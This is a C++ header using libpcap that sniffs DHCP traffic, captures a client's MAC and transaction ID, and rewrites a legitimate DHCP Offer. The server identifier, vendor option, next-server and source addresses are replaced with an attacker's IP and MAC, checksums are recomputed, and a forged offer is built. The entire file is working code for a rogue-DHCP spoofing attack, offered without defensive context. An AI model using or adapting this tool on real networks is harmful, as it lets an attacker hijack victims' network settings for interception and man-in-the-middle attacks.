#ifndef DETECT_PARSING_PACKET_H
#define DETECT_PARSING_PACKET_H
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include "checksum.h"
#include "dhcp_header.h"
#include "parse.h"

#define MTU 1500

void detect_parsing_packet(parse *ps)
{
    pcap_t *pcd;
    const u_char *packet;
    struct pcap_pkthdr *pkthdr;
    int res;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcd=pcap_open_live(ps->using_interface(), BUFSIZ, 1, 1, errbuf);
    int check{0},check2{0};
    while(true)
    {
        res=pcap_next_ex(pcd, &pkthdr, &packet);
        if(pkthdr->len<=0 || (check==1 && check2==1))
            break;
        switch (res)
        {
            case 1:
            {
                struct ether_header *ep = (struct ether_header *)packet;
                if(ep->ether_type==ntohs(0x0800))
                {
                    packet+=sizeof(struct ether_header);
                    struct iphdr *ip = (struct iphdr *)packet;
                    if(ip->protocol!=0x11)
                        break;
                    packet+=ip->ihl*4;
                    struct udphdr *up = (struct udphdr *)packet;
                    packet +=sizeof(struct udphdr);
                    struct bootstrap *bs = (struct bootstrap *)packet;
                    uint8_t *bspoint_packet=(uint8_t*)packet;
                    bspoint_packet+=sizeof(struct bootstrap);

                    uint8_t option=*bspoint_packet;
                    uint8_t *temp_pointer;

                    if(bs->message_type==0x01)
                    {
                        ps->parse_client_mac(ep->ether_shost);
                        ps->parse_transaction_id(bs->transaction_id);
                        check=1;
                        cout << ">> Client mac is parsed" << endl;
                    }
                    else if(bs->message_type==0x02)
                    {
                        while(option!=DHCP_OPTION_END)
                        {
                            uint8_t length{0};
                            switch (option)
                            {
                                case DHCP_OPTION_DHCP_SERVER_IDENTIFIER:
                                {
                                    bspoint_packet++;
                                    length=*bspoint_packet;
                                    memcpy(bspoint_packet+1,ps->using_attacker_dhcp_server_ip(),4);
                                    bspoint_packet+=length;
                                    option=*(bspoint_packet+1);
                                    bspoint_packet++;
                                }
                                break;
                                case DHCP_OPTION_VENDOR_ENCAPSULATED_OPTIONS:
                                {
                                    temp_pointer=bspoint_packet;
                                    bspoint_packet+=2;
                                    while(true)
                                    {
                                        length=0;
                                        if(*bspoint_packet==8)
                                        {
                                            bspoint_packet+=5;
                                            memcpy(bspoint_packet,ps->using_attacker_dhcp_server_ip(),4);
                                            break;
                                        }
                                        bspoint_packet++;
                                        length=*bspoint_packet;
                                        bspoint_packet++;
                                        bspoint_packet+=length;
                                    }
                                    bspoint_packet=temp_pointer;
                                    bspoint_packet++;
                                    length=*bspoint_packet;
                                    bspoint_packet+=length;
                                    option= *(bspoint_packet+1);
                                }
                                break;
                                default:
                                {
                                    bspoint_packet++;
                                    length=*bspoint_packet;
                                    bspoint_packet+=length;
                                    option= *(bspoint_packet+1);
                                    bspoint_packet++;
                                }
                                break;
                            }
                        }
                        cout << ">> Data modify Complete" << endl;
                        ps->make_dhcp_arr_space(MTU);
                        ps->get_dhcp_data_length(ntohs(up->len)-sizeof(struct udphdr));
                        ps->get_dhcp_data((uint8_t*)packet);
                        ps->make_dhcp_length(sizeof(struct ether_header)+ntohs(ip->tot_len));

                        cout << ">> DHCP Offer data is parsed" << endl;

                        memcpy(ep->ether_shost,ps->using_attacker_dhcp_server_mac(),6);
                        ps->make_dhcp_packet((uint8_t*)ep,sizeof(struct ether_header),false);
                        ps->pre_packet_length=sizeof(struct ether_header);
                        ip->saddr=*ps->using_attacker_dhcp_server_ip();
                        //ip checksum
                        ip->check=htons(ip_checksum(ip)); //
                        ps->make_dhcp_packet((uint8_t*)ip,ip->ihl*4,true);
                        ps->pre_packet_length+=ip->ihl*4;
                        bs->transaction_id=*ps->using_transaction_id();
                        //udp checksum
                        up->check=htons(udp_checksum(ip,up,ps));
                        ps->make_dhcp_packet((uint8_t*)up,sizeof(struct udphdr),true);
                        ps->pre_packet_length+=sizeof(struct udphdr);
                        bs->next_server_ip_addr=*ps->using_attacker_dhcp_server_ip();
                        ps->make_dhcp_packet((uint8_t*)bs,ps->using_dhcp_data_length(),true);
                        ps->show_dhcp_packet();
                        check2=1;
                    }
                }
            }
            break;
            case 0:
                continue;
            case -1:
            {
                printf(">> Error!!\n");
                pcap_close(pcd);
                sleep(1);
                pcd = pcap_open_live(ps->using_interface(), BUFSIZ, 1 , 1, errbuf);
            }
            break;
            case -2:
            {
                printf("EOF");
            }
            break;
            default:
            break;
        }
    }
}
#endif // DETECT_PARSING_PACKET_H
